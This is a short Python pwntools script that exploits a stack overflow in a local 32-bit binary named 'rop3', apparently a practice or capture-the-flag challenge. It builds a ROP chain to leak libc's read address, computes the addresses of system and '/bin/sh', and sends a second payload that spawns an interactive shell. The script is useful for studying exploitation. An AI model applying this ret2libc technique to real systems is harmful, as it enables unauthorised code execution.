from pprint import pprint as pp
from pwn import *

context(arch="i386", os="linux", log_level=logging.DEBUG)

# $1 = {ssize_t (int, void *, size_t)} 0xf7ece1a0 <__GI___libc_read>
# $2 = {int (const char *)} 0xf7e1e8b0 <__libc_system>
# gdb-peda$ p $1 - $2
# $5 = 0xaf8f0
# gdb-peda$ p exit
# $6 = {void (int)} 0xf7e112c0 <__GI_exit>
# gdb-peda$ p $1 - $6
# $7 = 0xbcee0
# gdb-peda$ find /bin
# Searching for '/bin' in: None ranges
# Found 13 results, display max 13 items:
#    libc : 0xf7f6942d ("/bin/sh")

io = process('./rop3', shell=True)

payload = ''.join([
    140 * 'A',          #
    p32(0x80483a0),
    p32(0x8048474),     # --> vulnerable_function
    p32(0x1),
    p32(0x804a000),
    p32(0x4),
])
io.sendline(payload)
# pp(io.recv(4))
read_addr = unpack(io.recv(4))
system_addr = read_addr - 0xaf8f0
binsh_addr = read_addr + 0x9b28d
log.info("read_addr   = 0x%x", read_addr)
log.info("system_addr = 0x%x", system_addr)
log.info("binsh_addr  = 0x%x", binsh_addr)


payload = ''.join([
    140 * 'A',          #
    p32(system_addr),
    p32(0xaaaaaaaa),
    p32(binsh_addr),
])
io.sendline(payload)
io.interactive()
